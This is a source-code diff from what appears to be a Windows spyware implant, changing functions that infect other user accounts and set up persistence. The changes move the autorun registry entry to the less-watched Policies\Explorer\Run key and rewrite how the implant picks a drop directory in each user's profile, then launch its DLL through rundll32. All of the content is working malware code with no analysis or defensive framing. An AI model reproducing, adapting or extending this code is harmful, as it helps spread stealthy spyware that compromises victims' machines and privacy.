@@ -398,10 +398,12 @@ BOOL IsUserInfected(WCHAR *dest_dir)
 
 	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
 	hfile = FNC(FindFirstFileW)(infection_path, &fdw);
-	if (hfile == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hfile);
-	return TRUE;
+	if (hfile != INVALID_HANDLE_VALUE) {
+		FNC(FindClose)(hfile);
+		return TRUE;
+	}
+
+	return FALSE;
 }
 
 void RollBackUser(WCHAR *dest_dir)
@@ -431,8 +433,8 @@ BOOL InfectRegistry(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Runonce", hive_mp);
 	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\RunOnce", hive_mp);
 #else
-	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Run", hive_mp);
-	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Run", hive_mp);
+	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", hive_mp);
+	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", hive_mp);
 #endif
 
 	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, uc_key, &hOpen) != ERROR_SUCCESS &&
@@ -442,7 +444,6 @@ BOOL InfectRegistry(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 		return FALSE;
 	}
 	
-	// XXX-CRISI2
 	// Path a rundll32.exe
 	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%%SystemRoot%%\\system32\\rundll32.exe \"%s\\%S\\%S\",%S", dest_dir, H4_HOME_DIR, H4DLLNAME, "PFTBBP8");
 	_snwprintf_s(uc_key, sizeof(uc_key)/sizeof(uc_key[0]), _TRUNCATE, L"%S", REGISTRY_KEY_NAME);
@@ -513,25 +514,42 @@ BOOL SpreadToUser(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 	return TRUE;
 }
 
-WCHAR *GetLocalSettings(WCHAR *tmp_dir)
+WCHAR *GetLocalSettings(WCHAR *tmp_dir, char *curr_home)
 {
-	WCHAR *temp_string, *ptr;
+	WCHAR *temp_string, *ptr = NULL;
+	char *ptr2 = NULL;
+	static WCHAR ret_string[MAX_PATH];
 	DWORD len;
 
+	ZeroMemory(ret_string, sizeof(ret_string));
 	temp_string = _wcsdup(tmp_dir);
 	if (!temp_string)
-		return NULL;
+		return ret_string;
+	if (ptr = wcschr(temp_string, L'\\')) {
+		ptr++;
+		if (ptr = wcschr(ptr, L'\\')) {
+			ptr++;
+			if (ptr = wcschr(ptr, L'\\')) {
+				ptr++;
+				*ptr = 0;
+			}
+		}
+	}
 
-	len = wcslen(temp_string); 
-	if (len == 0)
-		return temp_string;
-	if (temp_string[len-1] == L'\\')
-		temp_string[len-1] = 0;
+	if (ptr2 = strchr(curr_home, '\\')) {
+		ptr2++;
+		if (ptr2 = strchr(ptr2, '\\')) {
+			ptr2++;
+			if (ptr2 = strchr(ptr2, '\\')) 
+				ptr2++;
+		}
+	}
 
-	ptr = wcsrchr(temp_string, L'\\');
-	if (ptr)
-		*ptr = 0;
-	return temp_string;
+	if (ptr && ptr2)
+		_snwprintf_s(ret_string, MAX_PATH, _TRUNCATE, L"%s%S", temp_string, ptr2);		
+
+	SAFE_FREE(temp_string);
+	return ret_string;
 }
 
 void InfectUsers()
@@ -594,9 +612,9 @@ void InfectUsers()
 		}
 		
 		_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%s%s", user_home, user_temp);	
-		tmp_ptr = GetLocalSettings(tmp_buf); // Ricava la directory LocalSettings partendo dalla TEMP
-		// XXX-CRISI1
-		if (SpreadToUser(tmp_ptr, user_home, user_sid)) {
+		tmp_ptr = GetLocalSettings(tmp_buf, H4_HOME_PATH); // Ricava la directory dove dropparsi
+		
+		if (tmp_ptr[0] && SpreadToUser(tmp_ptr, user_home, user_sid)) {
 			if ( user_name = wcsrchr(user_home, L'\\') ) {
 				user_name++;
 				_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"[Inf. Module]: Spread to %s", user_name);
@@ -604,7 +622,7 @@ void InfectUsers()
 			}
 			one_user_infected = TRUE;
 		}
-		SAFE_FREE(tmp_ptr);
+		//SAFE_FREE(tmp_ptr);
 
 		SAFE_FREE(user_sid);
 		SAFE_FREE(temp_home);
